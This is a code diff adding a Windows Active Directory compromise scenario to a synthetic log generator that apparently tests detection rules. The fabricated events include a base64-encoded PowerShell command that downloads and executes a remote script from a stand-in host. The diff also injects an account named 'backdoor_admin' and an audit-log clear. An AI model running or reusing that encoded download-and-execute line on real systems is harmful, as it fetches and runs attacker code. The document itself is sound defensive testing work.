@@ -73,15 +73,16 @@ def simulate_logs(
     run_brute = scenario in ("brute_force", "mixed")
     run_spray = scenario in ("spraying", "mixed")
     run_web = scenario in ("web_attack", "mixed")
+    run_windows = scenario in ("windows_compromise", "mixed")
 
     # Generate background lines
-    num_background = max(500, total_lines // 2)
+    num_background = max(500, total_lines // 2) if scenario == "mixed" else 200
 
     for _ in range(num_background):
         current_ts += timedelta(seconds=rng.uniform(0.5, 3.0))
 
         # 1. SSH Benign Activity
-        if rng.random() < 0.4:
+        if (run_brute or run_spray or scenario == "mixed") and rng.random() < 0.4:
             user = rng.choice(BENIGN_USERS)
             internal_ip = f"10.0.0.{rng.randint(10, 50)}"
             port = rng.randint(30000, 60000)
@@ -99,7 +100,7 @@ def simulate_logs(
             )
 
         # 2. Web Benign Activity
-        if rng.random() < 0.6:
+        if (run_web or scenario == "mixed") and rng.random() < 0.6:
             ip = (
                 f"10.0.0.{rng.randint(10, 50)}"
                 if rng.random() < 0.7
@@ -112,6 +113,19 @@ def simulate_logs(
             size = rng.randint(200, 15000) if status == 200 else 0
             ua = rng.choice(BENIGN_UAS)
             web_lines.append(_format_web_line(ip, user, current_ts, method, path, status, size, ua))
+
+        # 3. Windows Benign Activity
+        if run_windows and rng.random() < 0.5:
+            user = rng.choice(BENIGN_USERS)
+            normal_win_evt = {
+                "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
+                "EventID": 4624,
+                "Computer": "DC01",
+                "TargetUserName": user,
+                "IpAddress": f"10.0.0.{rng.randint(10, 50)}",
+                "LogonType": 3,
+            }
+            windows_lines.append(json.dumps(normal_win_evt))
 
     # --- INJECT SCENARIO 1: SSH Brute Force ---
     if run_brute:
@@ -215,17 +229,131 @@ def simulate_logs(
 
         scenario_records.append(web_record)
 
-    # Write files
-    auth_file = target / "auth.log"
-    web_file = target / "access.log"
-    windows_file = target / "windows_security.jsonl"
-    labels_file = target / "labels.json"
+    # --- INJECT SCENARIO 4: Windows Active Directory Compromise ---
+    if run_windows:
+        win_record = ScenarioRecord(
+            scenario="windows_compromise",
+            file="windows_security.jsonl",
+            expected_rules=[
+                "WIN-001",
+                "WIN-002",
+                "WIN-003",
+                "WIN-004",
+                "WIN-005",
+                "WIN-006",
+                "WIN-007",
+            ],
+        )
+        win_attacker = "198.51.100.4"
+        current_ts += timedelta(minutes=2)
 
-    auth_file.write_text("\n".join(auth_lines) + "\n", encoding="utf-8")
-    web_file.write_text("\n".join(web_lines) + "\n", encoding="utf-8")
-    windows_file.write_text("\n".join(windows_lines), encoding="utf-8")
+        # 1. Logon failure burst (triggers WIN-001 and first step of WIN-007)
+        for _ in range(12):
+            current_ts += timedelta(seconds=rng.uniform(1.0, 3.0))
+            fail_evt = {
+                "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
+                "EventID": 4625,
+                "Computer": "DC01",
+                "TargetUserName": "administrator",
+                "IpAddress": win_attacker,
+                "LogonType": 3,
+            }
+            windows_lines.append(json.dumps(fail_evt))
+            win_record.line_numbers.append(len(windows_lines))
+
+        # 2. Successful logon from same IP (completes WIN-007 sequence)
+        current_ts += timedelta(seconds=2)
+        succ_evt = {
+            "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
+            "EventID": 4624,
+            "Computer": "DC01",
+            "TargetUserName": "administrator",
+            "IpAddress": win_attacker,
+            "LogonType": 3,
+        }
+        windows_lines.append(json.dumps(succ_evt))
+        win_record.line_numbers.append(len(windows_lines))
+
+        # 3. External RDP Logon (triggers WIN-002)
+        current_ts += timedelta(seconds=15)
+        rdp_evt = {
+            "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
+            "EventID": 4624,
+            "Computer": "DC01",
+            "TargetUserName": "administrator",
+            "IpAddress": "203.0.113.50",
+            "LogonType": 10,
+        }
+        windows_lines.append(json.dumps(rdp_evt))
+        win_record.line_numbers.append(len(windows_lines))
+
+        # 4. User account created (triggers WIN-003)
+        current_ts += timedelta(seconds=30)
+        user_evt = {
+            "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
+            "EventID": 4720,
+            "Computer": "DC01",
+            "TargetUserName": "backdoor_admin",
+            "SubjectUserName": "administrator",
+        }
+        windows_lines.append(json.dumps(user_evt))
+        win_record.line_numbers.append(len(windows_lines))
+
+        # 5. Added to local Administrators group (triggers WIN-004)
+        current_ts += timedelta(seconds=10)
+        group_evt = {
+            "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
+            "EventID": 4732,
+            "Computer": "DC01",
+            "TargetUserName": "Administrators",
+            "SubjectUserName": "backdoor_admin",
+        }
+        windows_lines.append(json.dumps(group_evt))
+        win_record.line_numbers.append(len(windows_lines))
+
+        # 6. Encoded PowerShell LOLBAS execution (triggers WIN-006)
+        current_ts += timedelta(seconds=20)
+        ps_evt = {
+            "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
+            "EventID": 4688,
+            "Computer": "DC01",
+            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": (
+                "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAI"
+                "ABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAG"
+                "QAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGkAbAAuAGMAbwB"
+                "tAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA=="
+            ),
+        }
+        windows_lines.append(json.dumps(ps_evt))
+        win_record.line_numbers.append(len(windows_lines))
+
+        # 7. Security audit log cleared (triggers WIN-005)
+        current_ts += timedelta(seconds=15)
+        clear_evt = {
+            "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
+            "EventID": 1102,
+            "Computer": "DC01",
+            "SubjectUserName": "backdoor_admin",
+        }
+        windows_lines.append(json.dumps(clear_evt))
+        win_record.line_numbers.append(len(windows_lines))
+
+        scenario_records.append(win_record)
+
+    # Write files
+    if auth_lines:
+        auth_file = target / "auth.log"
+        auth_file.write_text("\n".join(auth_lines) + "\n", encoding="utf-8")
+    if web_lines:
+        web_file = target / "access.log"
+        web_file.write_text("\n".join(web_lines) + "\n", encoding="utf-8")
+    if windows_lines:
+        windows_file = target / "windows_security.jsonl"
+        windows_file.write_text("\n".join(windows_lines) + "\n", encoding="utf-8")
 
     labels_data = [rec.to_dict() for rec in scenario_records]
+    labels_file = target / "labels.json"
     labels_file.write_text(json.dumps(labels_data, indent=2), encoding="utf-8")
 
     return scenario_records
